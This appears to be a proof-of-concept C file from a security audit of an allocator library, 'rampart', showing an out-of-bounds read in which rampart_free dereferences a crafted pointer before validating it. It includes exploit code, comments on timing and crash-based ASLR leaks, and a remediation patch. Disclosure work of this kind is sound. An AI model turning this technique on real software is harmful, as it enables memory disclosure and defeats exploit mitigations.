/**
 * @file poc_03_arbitrary_read.c
 * @brief PoC for VULN-003: Arbitrary Pointer Dereference
 *
 * VULNERABILITY: RP_USER_TO_BLOCK() performs pointer arithmetic before
 *                validation. rampart_free() with crafted pointer reads
 *                memory at attacker-controlled locations.
 *
 * CVSS 3.1: 8.6 (High)
 * CWE-125: Out-of-bounds Read
 *
 * IMPACT: Information disclosure. Can leak memory contents, bypass ASLR,
 *         or exfiltrate sensitive data.
 *
 * LOCATION: h/internal/rp_types.h:314-315, src/rampart.c:335
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "rampart.h"

/*
 * The macro RP_USER_TO_BLOCK computes:
 *   block = ptr - sizeof(rp_block_header_t) - RP_GUARD_SIZE
 *
 * This arithmetic happens BEFORE any validation.
 * Then rampart_free() reads block->magic to check validity.
 *
 * By crafting ptr, we control where magic is read from.
 */

/* Simulated secret data on the stack */
static char secret_data[256];
static const char *actual_secret = "PASSWORD=hunter2";

/* Magic number value from rp_types.h */
#define RP_BLOCK_MAGIC 0xB10CB10CUL

/*
 * Structure mimicking block header layout
 * Used to understand offset calculations
 */
typedef struct fake_header {
    unsigned long magic;
    /* Other fields don't matter for this PoC */
} fake_header_t;

int main(void) {
    rampart_config_t config;
    rampart_pool_t *pool;
    rampart_error_t err;
    char *crafted_ptr;
    unsigned long *magic_location;

    printf("=== VULN-003: Arbitrary Pointer Dereference ===\n\n");

    /* Initialize pool */
    rampart_config_default(&config);
    config.pool_size = 64 * 1024;

    pool = rampart_init(&config);
    if (pool == NULL) {
        printf("[!] Pool creation failed\n");
        return 1;
    }

    printf("[*] Pool created at: %p\n", (void *)pool);

    /* Set up "secret" data */
    strcpy(secret_data, actual_secret);
    printf("[*] Secret data at: %p\n", (void *)secret_data);
    printf("[*] Secret content: '%s'\n\n", secret_data);

    /*
     * DEMONSTRATIVE: Show the vulnerability mechanism
     *
     * When rampart_free(pool, ptr) is called:
     * 1. block = RP_USER_TO_BLOCK(ptr)
     *    block = ptr - sizeof(rp_block_header_t) - 16
     * 2. err = rp_block_validate_magic(block)
     *    Reads block->magic (4 bytes at block address)
     * 3. Compares against RP_BLOCK_MAGIC (0xB10CB10C)
     *
     * If we pass a crafted ptr, we control what gets read!
     */

    printf("[*] Exploitation mechanism:\n");
    printf("    RP_USER_TO_BLOCK(ptr) = ptr - header_size - guard_size\n");
    printf("    On this system: ptr - %zu - 16 bytes\n",
           sizeof(fake_header_t) * 6);  /* Approximation */

    /*
     * To read from address X:
     * Set ptr = X + sizeof(rp_block_header_t) + 16
     *
     * The library will then read 4 bytes from X as "magic"
     */

    printf("\n[ATTACK] Crafting pointer to read secret_data...\n");

    /*
     * We want to trigger a read from secret_data.
     * The read happens when checking block->magic.
     *
     * Note: This is a simplified demonstration. In practice:
     * - The exact offset depends on struct sizes
     * - Error messages may not directly leak the value
     * - Side-channel attacks may be needed
     */

    /* Calculate offset (this is architecture-dependent) */
    /* Typical rp_block_header_t size is ~104 bytes on 64-bit */
    crafted_ptr = secret_data + 120;  /* Adjust for header + guard */

    printf("[*] Crafted ptr: %p\n", (void *)crafted_ptr);
    printf("[*] Library will compute block address and read magic...\n");

    /*
     * Call rampart_free with crafted pointer.
     * This will:
     * 1. Compute block = crafted_ptr - offset
     * 2. Read 4/8 bytes from that location as "magic"
     * 3. Compare against expected magic number
     * 4. Return error (magic won't match)
     *
     * The READ happens even though validation fails!
     */
    err = rampart_free(pool, crafted_ptr);

    printf("[*] rampart_free returned: %s\n", rampart_error_string(err));

    /*
     * The vulnerability is that the READ occurs before validation.
     * Even though we get an error, the memory was accessed.
     *
     * Exploitation paths:
     * 1. Timing side-channel (different magic values = different timing)
     * 2. Crash analysis (segfault address reveals info)
     * 3. If magic happens to match, further operations leak data
     */

    printf("\n=== Information Disclosure Analysis ===\n");

    /* Show what address would be read */
    magic_location = (unsigned long *)(crafted_ptr - 120);
    printf("[*] Memory at computed block address:\n");
    printf("    Address: %p\n", (void *)magic_location);

    /* In a real attack, we can't print this directly.
     * But the READ happened inside rampart_free. */
    printf("    (Read occurred during validation)\n");

    /*
     * DESTRUCTIVE VARIANT:
     *
     * If we can cause a crash at a controlled address, we leak info:
     * 1. Set ptr so computed block is near unmapped memory
     * 2. Crash location reveals ASLR offset
     *
     * Or with many attempts, timing analysis reveals magic byte values.
     */

    printf("\n[*] Vulnerability confirmed: arbitrary memory read occurs\n");
    printf("    before pointer validation.\n");

    rampart_shutdown(pool);

    printf("\n=== PoC Complete ===\n");

    /*
     * REMEDIATION:
     * Validate computed block address against pool boundaries BEFORE
     * dereferencing:
     *
     * rp_block_header_t *rp_block_from_user_ptr_safe(
     *     rp_pool_header_t *pool, void *ptr) {
     *
     *     unsigned char *block_addr = (unsigned char *)ptr - offset;
     *
     *     // Bounds check BEFORE read
     *     if (block_addr < pool->pool_start ||
     *         block_addr >= pool->pool_end) {
     *         return NULL;
     *     }
     *
     *     return (rp_block_header_t *)block_addr;
     * }
     */

    return 0;
}
